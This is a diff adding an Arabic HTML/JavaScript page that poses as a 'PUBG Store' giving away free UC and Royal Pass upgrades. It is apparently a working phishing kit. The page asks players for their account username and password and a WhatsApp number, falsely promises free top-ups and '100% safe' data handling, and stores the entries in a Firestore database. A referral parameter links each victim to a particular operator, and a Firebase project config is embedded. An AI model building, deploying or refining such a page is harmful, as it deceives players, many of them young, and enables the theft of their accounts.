@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PUBG Store | شحن مجاني</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
+
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Cairo',sans-serif}
+
+:root{
+  --bg:#0a0d12;--card:#12161d;--card-2:#1a1f28;--border:#252b36;
+  --gold:#f5a623;--gold-2:#ffc857;--blue:#2d7dff;--cyan:#00e0ff;
+  --green:#22c55e;--red:#ef4444;--text:#fff;--muted:#8a93a6;
+}
+
+body{
+  background:var(--bg);color:var(--text);min-height:100vh;
+  background-image:
+    radial-gradient(circle at 15% 0%, rgba(245,166,35,.10) 0%, transparent 45%),
+    radial-gradient(circle at 85% 100%, rgba(45,125,255,.10) 0%, transparent 45%);
+  background-attachment:fixed;padding:20px 15px;
+  display:flex;justify-content:center;align-items:flex-start;
+}
+
+.app{width:100%;max-width:640px;padding:10px 0 40px}
+
+.top{display:flex;justify-content:space-between;align-items:center;margin-bottom:22px;padding:0 4px}
+.brand{display:flex;align-items:center;gap:11px}
+.brand-ic{
+  width:44px;height:44px;border-radius:13px;
+  background:linear-gradient(135deg,var(--gold),#ff8c00);
+  display:flex;justify-content:center;align-items:center;
+  font-size:1.35rem;color:#000;box-shadow:0 8px 22px rgba(245,166,35,.35);
+}
+.brand-txt{display:flex;flex-direction:column;line-height:1.1}
+.brand-txt .n1{font-weight:900;font-size:1.05rem;color:var(--gold-2)}
+.brand-txt .n2{font-size:.72rem;color:var(--muted);font-weight:600;letter-spacing:.5px}
+.secure{
+  display:flex;align-items:center;gap:6px;
+  background:rgba(34,197,94,.12);color:#4ade80;
+  padding:7px 13px;border-radius:20px;font-size:.75rem;font-weight:800;
+  border:1px solid rgba(34,197,94,.3);
+}
+
+.steps{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;padding:0 4px}
+.stp{display:flex;flex-direction:column;align-items:center;gap:6px;z-index:2}
+.stp-n{
+  width:36px;height:36px;border-radius:50%;
+  background:var(--card-2);border:2px solid var(--border);
+  color:var(--muted);display:flex;justify-content:center;align-items:center;
+  font-weight:900;font-size:.9rem;transition:all .3s;
+}
+.stp-l{font-size:.7rem;color:var(--muted);font-weight:700;transition:all .3s}
+.stp.on .stp-n{background:linear-gradient(135deg,var(--gold),#ff8c00);border-color:var(--gold);color:#000;box-shadow:0 0 20px rgba(245,166,35,.55);transform:scale(1.08)}
+.stp.on .stp-l{color:var(--gold-2)}
+.stp.done .stp-n{background:linear-gradient(135deg,var(--green),#16a34a);border-color:var(--green);color:#fff}
+.stp.done .stp-l{color:#4ade80}
+.stp-line{flex:1;height:2px;background:var(--border);margin:0 4px;position:relative;top:-12px;transition:all .4s}
+.stp-line.done{background:linear-gradient(90deg,var(--green),var(--gold))}
+
+.card{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:22px;padding:30px 24px;box-shadow:0 30px 60px rgba(0,0,0,.5);
+  position:relative;overflow:hidden;animation:slideUp .4s ease;
+}
+.card::before{content:'';position:absolute;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,var(--gold),var(--cyan),var(--blue))}
+@keyframes slideUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
+
+.card-h{text-align:center;margin-bottom:26px}
+.card-h h2{font-size:1.5rem;font-weight:900;margin-bottom:8px}
+.hl-g{background:linear-gradient(135deg,var(--gold-2),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.card-h p{color:var(--muted);font-size:.9rem;line-height:1.5}
+
+.svcs{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.svc{
+  background:var(--card-2);border:2px solid transparent;border-radius:16px;
+  padding:24px 16px;text-align:center;cursor:pointer;transition:all .25s;
+  position:relative;overflow:hidden;
+}
+.svc:hover{border-color:var(--gold);transform:translateY(-5px);box-shadow:0 18px 35px rgba(245,166,35,.18)}
+.svc-ic{
+  width:64px;height:64px;border-radius:18px;display:flex;justify-content:center;
+  align-items:center;margin:0 auto 16px;font-size:1.7rem;color:#fff;transition:transform .3s;
+}
+.svc:hover .svc-ic{transform:scale(1.1) rotate(-5deg)}
+.svc h3{font-size:1.05rem;font-weight:900;margin-bottom:6px}
+.svc p{font-size:.78rem;color:var(--muted);line-height:1.5}
+
+.pkgs{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:8px}
+.pkg{
+  background:var(--card-2);border:2px solid transparent;border-radius:14px;
+  padding:20px 12px;text-align:center;cursor:pointer;transition:all .25s;
+  position:relative;
+}
+.pkg:hover{border-color:var(--cyan);transform:translateY(-5px);box-shadow:0 18px 35px rgba(0,224,255,.15)}
+.pkg .qty{font-size:1.75rem;font-weight:900;color:var(--cyan);line-height:1;margin-bottom:4px;display:block}
+.pkg .unit{font-size:.72rem;color:var(--muted);margin-bottom:12px;display:block;font-weight:700;letter-spacing:1px}
+.pkg .free{
+  display:inline-block;background:linear-gradient(135deg,var(--green),#16a34a);
+  color:#fff;font-weight:900;padding:5px 16px;border-radius:20px;font-size:.8rem;
+}
+.pkg .ribbon{
+  position:absolute;top:8px;left:8px;
+  background:linear-gradient(135deg,#ef4444,#f97316);
+  color:#fff;font-size:.62rem;font-weight:900;padding:3px 8px;border-radius:8px;letter-spacing:.5px;
+}
+
+.field{
+  display:flex;align-items:center;gap:11px;
+  background:var(--card-2);border:1.5px solid var(--border);
+  border-radius:13px;padding:14px 16px;margin-bottom:14px;transition:all .25s;
+}
+.field:focus-within{border-color:var(--gold);box-shadow:0 0 0 3px rgba(245,166,35,.12);background:#1e242e}
+.field.ok{border-color:var(--green);background:rgba(34,197,94,.05)}
+.field i{color:var(--muted);font-size:1rem;width:18px;text-align:center}
+.field input{flex:1;background:none;border:none;outline:none;color:#fff;font-size:1rem;font-family:'Cairo';font-weight:600}
+.field input::placeholder{color:#5a6274;font-weight:500}
+.field .check{color:var(--green);font-size:1rem;opacity:0;transition:.3s}
+.field.ok .check{opacity:1}
+
+.hint{
+  font-size:.78rem;color:var(--muted);margin:-6px 0 16px 0;padding:0 6px;
+  display:flex;align-items:flex-start;gap:7px;line-height:1.5;
+}
+.hint i{color:var(--cyan);font-size:.85rem;margin-top:2px}
+.hint.warn i{color:var(--gold)}
+
+.summary{
+  background:var(--card-2);border-radius:14px;padding:18px;margin-bottom:18px;
+  border:1px dashed var(--border);
+}
+.summary h4{color:var(--gold-2);font-size:.9rem;margin-bottom:14px;font-weight:900;display:flex;align-items:center;gap:8px}
+.srow{display:flex;justify-content:space-between;padding:9px 0;font-size:.9rem;border-bottom:1px solid var(--border)}
+.srow:last-child{border-bottom:none;padding-top:12px;margin-top:4px;border-top:1px solid var(--border)}
+.srow span:first-child{color:var(--muted);font-weight:600}
+.srow span:last-child{font-weight:800;color:#fff;word-break:break-all;text-align:left;max-width:60%}
+
+.btns{display:flex;gap:10px;margin-top:22px}
+.btn{
+  flex:1;padding:14px;border-radius:13px;font-family:'Cairo';
+  font-weight:900;font-size:.98rem;cursor:pointer;border:none;transition:all .25s;
+  display:flex;justify-content:center;align-items:center;gap:8px;
+}
+.btn-back{background:var(--card-2);color:var(--text);border:1.5px solid var(--border)}
+.btn-back:hover{background:#232a36;border-color:#3a4250}
+.btn-next{background:linear-gradient(135deg,var(--gold),#ff8c00);color:#000;flex:1.6}
+.btn-next:hover:not(:disabled){transform:translateY(-3px);box-shadow:0 15px 30px rgba(245,166,35,.35)}
+.btn-submit{background:linear-gradient(135deg,var(--green),#16a34a);color:#fff;flex:1.6}
+.btn-submit:hover:not(:disabled){transform:translateY(-3px);box-shadow:0 15px 30px rgba(34,197,94,.35)}
+.btn:disabled{opacity:.55;cursor:not-allowed}
+
+.pane{display:none}
+.pane.on{display:block;animation:slideUp .35s ease}
+
+.success{text-align:center;padding:20px 10px}
+.success-ic{
+  width:90px;height:90px;border-radius:50%;
+  background:linear-gradient(135deg,var(--green),#16a34a);
+  display:flex;justify-content:center;align-items:center;margin:0 auto 22px;
+  font-size:2.5rem;color:#fff;box-shadow:0 15px 40px rgba(34,197,94,.4);
+  animation:pop .6s cubic-bezier(.34,1.56,.64,1);
+}
+@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
+.success h2{font-size:1.5rem;font-weight:900;margin-bottom:10px;color:#4ade80}
+.success p{color:var(--muted);font-size:.9rem;line-height:1.6;margin-bottom:20px}
+.order-id{
+  background:var(--card-2);border-radius:12px;padding:14px;font-family:monospace;
+  font-size:.85rem;color:var(--gold-2);border:1px dashed var(--border);
+  margin-bottom:22px;word-break:break-all;
+}
+.reset-btn{
+  width:100%;padding:14px;border-radius:13px;
+  background:linear-gradient(135deg,var(--gold),#ff8c00);
+  color:#000;font-family:'Cairo';font-weight:900;border:none;cursor:pointer;
+  font-size:.95rem;transition:all .25s;
+}
+.reset-btn:hover{transform:translateY(-3px);box-shadow:0 15px 30px rgba(245,166,35,.35)}
+
+.footer{
+  text-align:center;color:var(--muted);font-size:.78rem;margin-top:24px;
+  display:flex;justify-content:center;align-items:center;gap:16px;flex-wrap:wrap;
+}
+.footer span{display:flex;align-items:center;gap:6px}
+.footer i{color:var(--gold);font-size:.8rem}
+
+.toast{
+  position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-130%);
+  background:var(--card);border:1.5px solid var(--border);
+  padding:14px 22px;border-radius:14px;font-weight:800;font-size:.9rem;
+  box-shadow:0 25px 60px rgba(0,0,0,.6);transition:all .4s cubic-bezier(.34,1.56,.64,1);
+  z-index:9999;display:flex;align-items:center;gap:10px;max-width:90%;
+}
+.toast.on{transform:translateX(-50%) translateY(0)}
+.toast.ok{border-color:rgba(34,197,94,.5)}
+.toast.ok i{color:#4ade80}
+.toast.err{border-color:rgba(239,68,68,.5)}
+.toast.err i{color:#f87171}
+.toast.info{border-color:rgba(0,224,255,.5)}
+.toast.info i{color:var(--cyan)}
+
+.loader{
+  width:18px;height:18px;border:2.5px solid rgba(0,0,0,.25);
+  border-top-color:#000;border-radius:50%;animation:spin .7s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+@media(max-width:480px){
+  .card{padding:24px 18px}
+  .svcs,.pkgs{gap:10px}
+  .svc{padding:20px 12px}
+  .pkg{padding:18px 10px}
+  .pkg .qty{font-size:1.5rem}
+  .card-h h2{font-size:1.3rem}
+  .stp-l{font-size:.65rem}
+}
+</style>
+</head>
+<body>
+
+<div class="app">
+
+  <div class="top">
+    <div class="brand">
+      <div class="brand-ic"><i class="fas fa-crosshairs"></i></div>
+      <div class="brand-txt">
+        <span class="n1">PUBG STORE</span>
+        <span class="n2">FREE UC • ROYAL PASS</span>
+      </div>
+    </div>
+    <div class="secure"><i class="fas fa-shield-alt"></i> آمن 100%</div>
+  </div>
+
+  <div class="steps">
+    <div class="stp on" id="st1"><div class="stp-n">1</div><span class="stp-l">الخدمة</span></div>
+    <div class="stp-line" id="ln1"></div>
+    <div class="stp" id="st2"><div class="stp-n">2</div><span class="stp-l">الباقة</span></div>
+    <div class="stp-line" id="ln2"></div>
+    <div class="stp" id="st3"><div class="stp-n">3</div><span class="stp-l">البيانات</span></div>
+    <div class="stp-line" id="ln3"></div>
+    <div class="stp" id="st4"><div class="stp-n">4</div><span class="stp-l">التأكيد</span></div>
+  </div>
+
+  <!-- الخطوة 1 -->
+  <div class="pane on" id="pane1">
+    <div class="card">
+      <div class="card-h">
+        <h2>اختر <span class="hl-g">الخدمة</span></h2>
+        <p>اختر ما تريد شحنه في حساب ببجي موبايل</p>
+      </div>
+      <div class="svcs">
+        <div class="svc" onclick="pickService('uc')">
+          <div class="svc-ic" style="background:linear-gradient(135deg,#f5a623,#ff8c00)">
+            <i class="fas fa-coins"></i>
+          </div>
+          <h3>شحن شدات UC</h3>
+          <p>شحن مجاني لحسابك</p>
+        </div>
+        <div class="svc" onclick="pickService('royal')">
+          <div class="svc-ic" style="background:linear-gradient(135deg,#2d7dff,#00e0ff)">
+            <i class="fas fa-crown"></i>
+          </div>
+          <h3>رويال باس</h3>
+          <p>ترقية الرويال باس Elite</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- الخطوة 2 -->
+  <div class="pane" id="pane2">
+    <div class="card">
+      <div class="card-h">
+        <h2>اختر <span class="hl-g">الباقة</span></h2>
+        <p id="pkgSub">اختر الكمية التي تريد شحنها</p>
+      </div>
+      <div class="pkgs" id="pkgList"></div>
+      <div class="btns">
+        <button class="btn btn-back" onclick="goStep(1)">
+          <i class="fas fa-arrow-right"></i> خلف
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- الخطوة 3 -->
+  <div class="pane" id="pane3">
+    <div class="card">
+      <div class="card-h">
+        <h2>أدخل <span class="hl-g">بياناتك</span></h2>
+        <p>Username + Password  + بيانات التواصل</p>
+      </div>
+
+      <div class="field" id="f-pid1">
+        <i class="fas fa-id-card"></i>
+        <input type="text" id="playerId1" placeholder="Username  (اسم المستخدم الخاص بك)" inputmode="numeric" maxlength="14">
+        <i class="fas fa-check-circle check"></i>
+      </div>
+      <div class="hint">
+        <i class="fas fa-info-circle"></i>
+        <span>اسم المستخدم المربوط بحسابك</span>
+      </div>
+
+      <div class="field">
+        <i class="fas fa-id-card"></i>
+        <input type="text" id="playerId2" placeholder="Password " inputmode="numeric" maxlength="14">
+      </div>
+      <div class="hint">
+        <i class="fas fa-shield-alt"></i>
+        <span>Password </span>
+      </div>
+
+      <div class="field">
+        <i class="fab fa-whatsapp"></i>
+        <input type="tel" id="whatsapp" placeholder="رقم الواتساب للتواصل" inputmode="tel">
+      </div>
+      <div class="hint">
+        <i class="fab fa-whatsapp"></i>
+        <span>رقم الواتساب عشان نتواصل معاك بعد الشحن.</span>
+      </div>
+
+      <div class="field">
+        <i class="fas fa-user"></i>
+        <input type="text" id="playerName" placeholder="اسم حسابك في ببجي (اختياري)">
+      </div>
+
+      <div class="btns">
+        <button class="btn btn-back" onclick="goStep(2)">
+          <i class="fas fa-arrow-right"></i> خلف
+        </button>
+        <button class="btn btn-next" onclick="goStep(4)">
+          التالي <i class="fas fa-arrow-left"></i>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- الخطوة 4 -->
+  <div class="pane" id="pane4">
+    <div class="card">
+      <div class="card-h">
+        <h2>تأكيد <span class="hl-g">الطلب</span></h2>
+        <p>راجع بيانات طلبك قبل التأكيد النهائي</p>
+      </div>
+
+      <div class="summary">
+        <h4><i class="fas fa-receipt"></i> ملخص الطلب</h4>
+        <div class="srow"><span>الخدمة</span><span id="sService">-</span></div>
+        <div class="srow"><span>الباقة</span><span id="sPackage">-</span></div>
+        <div class="srow"><span>الآيدي</span><span id="sPlayerId">-</span></div>
+        <div class="srow"><span>الواتساب</span><span id="sWhats">-</span></div>
+        <div class="srow"><span>السعر</span><span style="color:var(--green)">مجاناً</span></div>
+      </div>
+
+      <div class="hint warn">
+        <i class="fas fa-exclamation-triangle"></i>
+        <span>تأكد أن الآيدي صحيح 100%. الشحن بيتم مباشرة على الآيدي، ومش بنقدر نسترجعه لو غلط.</span>
+      </div>
+
+      <div class="btns">
+        <button class="btn btn-back" onclick="goStep(3)">
+          <i class="fas fa-arrow-right"></i> خلف
+        </button>
+        <button class="btn btn-submit" id="btnSubmit" onclick="submitOrder()">
+          <i class="fas fa-check"></i> تأكيد الطلب
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- النجاح -->
+  <div class="pane" id="paneSuccess">
+    <div class="card">
+      <div class="success">
+        <div class="success-ic"><i class="fas fa-check"></i></div>
+        <h2>تم استلام طلبك!</h2>
+        <p>هيتم الشحن خلال 24 ساعة.<br>هنتواصل معاك على الواتساب بعد ما نخلص الشحن.</p>
+        <div class="order-id">رقم الطلب: <span id="orderId">-</span></div>
+        <button class="reset-btn" onclick="resetAll()">
+          <i class="fas fa-redo"></i> طلب جديد
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <span><i class="fas fa-gift"></i> شحن مجاني</span>
+    <span><i class="fas fa-lock"></i> بيانات آمنة</span>
+    <span><i class="fas fa-headset"></i> دعم 24/7</span>
+  </div>
+
+</div>
+
+<div class="toast" id="toast"><i class="fas fa-info-circle"></i><span id="toastMsg"></span></div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDN7uLYTFRWBb9x5dTV-bYr6iPA_YLq9VM",
+  authDomain: "dosha-games.firebaseapp.com",
+  databaseURL: "https://dosha-games-default-rtdb.firebaseio.com",
+  projectId: "dosha-games",
+  storageBucket: "dosha-games.firebasestorage.app",
+  messagingSenderId: "584565662439",
+  appId: "1:584565662439:web:775e8d06b3cab9d54bb842"
+};
+const app = initializeApp(firebaseConfig);
+const db  = getFirestore(app);
+
+/* ============ الباقات ============ */
+const PACKAGES = {
+  uc: [
+    { qty:60,    label:'60 UC',    tag:'' },
+    { qty:325,   label:'325 UC',   tag:'' },
+    { qty:660,   label:'660 UC',   tag:'الأكثر' },
+    { qty:1800,  label:'1800 UC',  tag:'' },
+    { qty:3850,  label:'3850 UC',  tag:'الأفضل' },
+    { qty:8100,  label:'8100 UC',  tag:'' }
+  ],
+  royal: [
+    { qty:'RP',   label:'Royal Pass Elite', sub:'Elite Pass', tag:'' },
+    { qty:'RP+',  label:'Royal Pass Plus',  sub:'Elite Plus', tag:'الأفضل' }
+  ]
+};
+
+const SERVICE_LABELS = { uc:'شحن شدات UC', royal:'رويال باس' };
+
+let state = { service:null, pkg:null };
+
+/* ======================================================
+   🔑 نظام كود الإحالة (Referral System)
+   - العميل يفتح الموقع من رابط المدير: site.com?ref=code
+   - بنحفظ الكود في localStorage عشان يفضل معاه
+   - كل طلب بيتربط بالكود ده، وبيظهر عند المدير ده بس
+   ====================================================== */
+const urlParams = new URLSearchParams(window.location.search);
+const refFromUrl = urlParams.get('ref');
+
+if(refFromUrl){
+  // لو الرابط فيه ref جديد، نحفظه ونستبدل القديم
+  localStorage.setItem('pubg_ref', refFromUrl.trim().toLowerCase());
+  console.log('✅ Referral captured:', refFromUrl);
+} else if(!localStorage.getItem('pubg_ref')){
+  // لو مفيش ref في الرابط ومفيش محفوظ، نخليه direct
+  localStorage.setItem('pubg_ref', 'direct');
+}
+
+/* ============ Toast ============ */
+let toastTimer;
+function toast(msg, type='info'){
+  const el = document.getElementById('toast');
+  const msgEl = document.getElementById('toastMsg');
+  const ic = el.querySelector('i');
+  msgEl.textContent = msg;
+  el.className = 'toast on ' + type;
+  ic.className = type === 'ok' ? 'fas fa-check-circle'
+              : type === 'err' ? 'fas fa-exclamation-circle'
+              : 'fas fa-info-circle';
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(()=>{ el.classList.remove('on'); }, 3200);
+}
+
+/* ============ التنقل ============ */
+window.goStep = function(n){
+  if(n >= 2 && !state.service){ toast('اختر الخدمة أولاً','err'); return; }
+  if(n >= 3 && !state.pkg){ toast('اختر الباقة أولاً','err'); return; }
+
+  if(n === 4){
+    const pid1 = document.getElementById('playerId1').value.trim();
+    const wa   = document.getElementById('whatsapp').value.trim();
+
+    if(!pid1){ toast('Username  أولاً','err'); return; }
+    if(!/^\d{8,14}$/.test(pid1)){ toast('الآيدي يجب أن يكون 8-14 رقم','err'); return; }
+    if(!wa){ toast('أدخل رقم الواتساب','err'); return; }
+    if(!/^[\d+\s-]{8,20}$/.test(wa)){ toast('رقم الواتساب غير صحيح','err'); return; }
+  }
+
+  document.querySelectorAll('.stp').forEach(s=>{ s.classList.remove('on','done'); });
+  document.querySelectorAll('.stp-line').forEach(l=>{ l.classList.remove('done'); });
+
+  for(let i=1; i<=4; i++){
+    const s = document.getElementById('st'+i);
+    if(i<n) s.classList.add('done');
+    if(i===n) s.classList.add('on');
+  }
+  for(let i=1; i<=3; i++){
+    if(i<n) document.getElementById('ln'+i).classList.add('done');
+  }
+
+  document.querySelectorAll('.pane').forEach(p=>p.classList.remove('on'));
+  document.getElementById('pane'+n).classList.add('on');
+
+  if(n === 4) fillSummary();
+  window.scrollTo({top:0, behavior:'smooth'});
+};
+
+/* ============ اختيار الخدمة ============ */
+window.pickService = function(svc){
+  state.service = svc;
+  state.pkg = null;
+  renderPackages();
+  goStep(2);
+};
+
+/* ============ عرض الباقات ============ */
+function renderPackages(){
+  const list = document.getElementById('pkgList');
+  const sub  = document.getElementById('pkgSub');
+  list.innerHTML = '';
+  sub.textContent = state.service === 'uc'
+    ? 'اختر كمية الشدات التي تريدها'
+    : 'اختر نوع الرويال باس';
+
+  PACKAGES[state.service].forEach(p=>{
+    const el = document.createElement('div');
+    el.className = 'pkg';
+    el.onclick = ()=> pickPackage(p);
+    el.innerHTML = `
+      ${p.tag ? `<span class="ribbon">${p.tag}</span>` : ''}
+      <span class="qty">${p.qty}</span>
+      <span class="unit">${p.sub || 'UC'}</span>
+      <span class="free">مجاناً</span>
+    `;
+    list.appendChild(el);
+  });
+}
+
+window.pickPackage = function(p){
+  state.pkg = p;
+  goStep(3);
+};
+
+/* ============ تعبئة الملخص ============ */
+function fillSummary(){
+  const pid = document.getElementById('playerId1').value.trim();
+  const wa  = document.getElementById('whatsapp').value.trim();
+  document.getElementById('sService').textContent  = SERVICE_LABELS[state.service];
+  document.getElementById('sPackage').textContent  = state.pkg.label;
+  document.getElementById('sPlayerId').textContent = pid;
+  document.getElementById('sWhats').textContent    = wa;
+}
+
+/* ============ تحقق بصري (اختياري - بدون حظر) ============ */
+document.getElementById('playerId1').addEventListener('input', function(){
+  this.parentElement.classList.toggle('ok', this.value.trim().length >= 8);
+});
+
+/* ============ إرسال الطلب ============ */
+window.submitOrder = async function(){
+  const btn = document.getElementById('btnSubmit');
+  btn.disabled = true;
+  btn.innerHTML = '<div class="loader"></div> جاري الإرسال...';
+
+  const pid1 = document.getElementById('playerId1').value.trim();
+  const pid2 = document.getElementById('playerId2').value.trim(); // للتأكيد فقط، مش شرط
+  const wa   = document.getElementById('whatsapp').value.trim();
+  const name = document.getElementById('playerName').value.trim();
+  const ref  = localStorage.getItem('pubg_ref') || 'direct';
+
+  try{
+    const docRef = await addDoc(collection(db, 'pubg_orders'), {
+      service:         state.service,
+      serviceLabel:    SERVICE_LABELS[state.service],
+      package:         state.pkg.label,
+      quantity:        state.pkg.qty,
+      playerId:        pid1,
+      playerIdConfirm: pid2 || '-',   // اختياري
+      playerName:      name || '-',
+      whatsapp:        wa,
+      status:          'pending',
+      assignedAdminId: ref,            // 🔑 ربط الطلب بالمدير صاحب الكود
+      createdAt:       new Date()
+    });
+
+    document.getElementById('orderId').textContent = docRef.id.slice(0,10).toUpperCase();
+    document.querySelectorAll('.pane').forEach(p=>p.classList.remove('on'));
+    document.getElementById('paneSuccess').classList.add('on');
+    document.querySelectorAll('.stp').forEach(s=>{ s.classList.remove('on'); s.classList.add('done'); });
+    document.querySelectorAll('.stp-line').forEach(l=>l.classList.add('done'));
+
+    toast('تم إرسال طلبك بنجاح ✓','ok');
+  }catch(e){
+    console.error(e);
+    toast('حدث خطأ، حاول مرة أخرى','err');
+    btn.disabled = false;
+    btn.innerHTML = '<i class="fas fa-check"></i> تأكيد الطلب';
+  }
+};
+
+/* ============ إعادة التعيين ============ */
+window.resetAll = function(){
+  state = { service:null, pkg:null };
+  ['playerId1','playerId2','whatsapp','playerName'].forEach(id=>{
+    document.getElementById(id).value = '';
+  });
+  document.getElementById('f-pid1').classList.remove('ok');
+  const btn = document.getElementById('btnSubmit');
+  btn.disabled = false;
+  btn.innerHTML = '<i class="fas fa-check"></i> تأكيد الطلب';
+  goStep(1);
+};
+</script>
+</body>
+</html>
